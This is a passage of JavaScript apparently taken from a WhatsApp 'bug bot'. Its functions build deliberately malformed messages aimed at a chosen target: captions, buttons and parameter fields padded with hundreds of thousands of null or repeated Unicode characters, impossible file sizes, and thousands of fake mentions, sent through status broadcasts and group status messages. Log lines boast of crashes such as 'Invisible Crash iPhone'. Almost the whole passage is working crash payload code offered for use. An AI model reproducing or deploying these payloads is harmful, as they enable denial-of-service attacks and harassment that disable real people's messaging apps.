      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`BERHASIL SEND BUG: ${target}!`))
}

async function YTXteri(sock, target) {
    const Sqk = "¿¡¡?".repeat(10000);

    const Image = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                    fileLength: "99999999999999999",
                    height: "9999999999999999",
                    width: "9999999999999999",
                    mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                    fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                    directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "172519628",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                    streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                    caption: " ¿¡¡?".repeat(20000) + "ꦾ".repeat(60000),
                    contextInfo: {
                        stanzaId: "Vinzz.php",
                        isForwarded: true,
                        forwardingScore: 999,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
                        ],
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "¡¡?",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "address_message",
                            ParamsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
                            version: 4,
                        }
                    }
                }
            }
        }
    };
    
    const stickerMsg = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/webp",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "1173741824",
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    isAnimated: false,
                    viewOnce: false,
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({ length: 1900 }, () =>
                                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            viewOnceMessage: {
                                message: {
                                    interactiveResponseMessage: {
                                        body: { text: "", format: "DEFAULT" },
                                        nativeFlowResponseMessage: {
                                            name: "call_permission_request",
                                            paramsJson: "\u0000".repeat(99999),
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const Audio = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
                    fileLength: 99999999999999,
                    seconds: 99999999999999,
                    ptt: true,
                    mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
                    fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
                    directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 99999999999999,
                    contextInfo: {
                        mentionedJid: [
                            "@s.whatsapp.net",
                            ...Array.from({ length: 1900 }, () =>
                                `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                            ),
                        ],
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "99999999999@newsletter",
                            serverMessageId: 1,
                            newsletterName: "XTRX XATANICAL",
                        }
                    }
                }
            }
        }
    };

    const pantek = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    url: "https://files.catbox.moe/yyzesp.mp4",
                    mimetype: "video/mp4",
                    fileSha256: "QxkYuxM0qMDgqUK5WCi91bKWGFDoHhNNkrRlfMNEjTo=",
                    fileLength: "999999999999",
                    height: 999999999,
                    width: 999999999,
                    mediaKey: "prx9yPJPZEJ5aVgJnrpnHYCe8UzNZX6/QFESh0FTq+w=",
                    fileEncSha256: "zJgg0nMJT1uBohdzwDXkOxaRlQnhJZb+qzLF1lbLucc=",
                    directPath: "/v/t62.7118-24/540333979_2660244380983043_2025707384462578704_n.enc?ccb=11-4&oh=01_Q5Aa3AH58d8JlgVc6ErscnjG1Pyj7cT682cpI5AeJRCkGBE2Wg&oe=6934CBA0&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1762488513",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAIAMBIgACEQEDEQH/xAAtAAACAwEAAAAAAAAAAAAAAAAABAIDBQEBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAAQgzOsuOtNHI6YZhpxRWpeubdXLKhm1ckeEqlp6CS4B//xAAkEAACAwABAwQDAQAAAAAAAAABAgADEQQSFCETMUFREDJCUv/aAAgBAQABPwDtVC4riLw6zvU8bitpzI1Tge0FQW1ARgjUKOSVzwZZxwjossqSpQp8ndyXUNYQ31DxrS4eNxrGsDmcjju7KyjzD+G8TcG7H5PSPE7m2dwzIwM63/1P3c/QlrqkqAdfqehn9CLfWPacy0m3QYrM1S4fM67x8iBg3zkZAf6muAMMc2fJgvOZk9YzuW9sh5BzMn//xAAXEQEBAQEAAAAAAAAAAAAAAAARAAEg/9oACAECAQE/ACJmLNOf/8QAGREBAQADAQAAAAAAAAAAAAAAAREAAhBC/9oACAEDAQE/ADaNg5cdVJZhqnpeJeV7/9k=",
                    caption: Sqk,
                    contextInfo: {
                        stanzaId: "SqkWithYou.id",
                        isForwarded: true,
                        forwardingScore: 999,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1990 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
                        ]
                    }
                }
            }
        }
    };

    const msg1 = generateWAMessageFromContent(target, stickerMsg, {});
    const msg2 = generateWAMessageFromContent(target, Image, {});
    const msg3 = generateWAMessageFromContent(target, pantek, {});
    const msg4 = generateWAMessageFromContent(target, Audio, {});

    for (const msg of [msg1, msg2, msg3, msg4]) {
        await sock.relayMessage("status@broadcast", msg.message ?? msg, {
            messageId: msg.key?.id || undefined,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
    }
    console.log(chalk.red(`Sukses Sending Bug ${target}`));
}


async function notagstory(target, mention) {
const maklo = "" + "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
         url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "" + maklo,
            matchedText: "",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "" + "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await sock.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await sock.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      console.log(chalk.Blue(`Invisible Crash iPhone ${target}`));
   } catch (err) {
      console.error(err);
   }
};

async function ctarlResponse(target, cta = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg2.message
    }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}

async function gsGlx(target, zid = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1${y + 1}@s.whatsapp.net`), 
        isForwarded: true, 
        forwardingScore: 7205,
        expiration: 0
      }, 
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
}

async function stickerDelay(sock, target, cta = true) {
  await sock.sendMessage(target, {
    sticker: {
      url: "https://stickershop.line-scdn.net/stickershop/v1/product/12623887/LINEStorePC/main.png",
      injected: `
let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => \`1\${y + 1}@s.whatsapp.net\`), 
        isForwarded: true, 
        forwardingScore: 7205,
        expiration: 0
      }, 
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: \`{\\\"flow_cta\\\":\\\"${"\u0000".repeat(900000)}\\\"}}\`,
        version: 3
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
      `
    }
  });
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });

}

async function ZhTHxhChanges(sock, target) {
    let ZhTxRizzMsg = await generateWAMessageFromContent(
        target,
        {
            buttonsMessage: {
                text: "🐦‍🔥",
                contentText: "",
                footerText: "༑",
                buttons: [
                    {
                        buttonId: ".",
                        buttonText: {
                            displayText: "🐦‍🔥" + "\u0000".repeat(900000),
                        },
                        type: 1,
                    },
                ],
                headerType: 1,
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 0,
            isForwarded: false,
            font: Math.floor(Math.random() * 9),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "0"),
        }
    );

    await sock.relayMessage("status@broadcast", ZhTxRizzMsg.message, {
        messageId: ZhTxRizzMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [
                    { tag: "to", attrs: { jid: target }, content: undefined }
                ]
            }]
        }]
    });
    console.log(chalk.red(`Succes Bug ${target}`));
}

async function glorymessage(target, cta = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
}

async function ctaPayment(sock, target, cta) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });
  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Mabar Ml bang", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});
  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
  let msg3 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "ASSALAMUALAIKUM Izin Promosi Di WhatsApp Ya",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await sock.relayMessage("status@broadcast", msg3.message, {
    messageId: msg3.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

}

async function obfuspot(target, zid = true) {
  await privatedelay();
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1${y + 1}@s.whatsapp.net`),
        isForwarded: true, 
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, zid ? { messageId: msg.key.id, participant: { jid:target } } : { messageId: msg.key.id });
}

async function ForceNewsletter(target) {
  await sock.relayMessage(target, {
    groupStatusMentionMessage: {
      message: {
        protocolMessage: {
          key: {
            participant: "131355550002@s.whatsapp.net",
            remoteJid: "status@broadcast",
            id: generateMessageTag()
          },
          type: "STATUS_MENTION_MESSAGE"
        }
      }
    }
  }, {})
  console.log("\x1b[34m[INFO]\x1b[0m Bug channel telah terkirim ke:", target);
}

async function ZhTGinou(sock, target) {
  const cards = [];

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
  
  
  const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 50; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "Lolipop Xtream" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
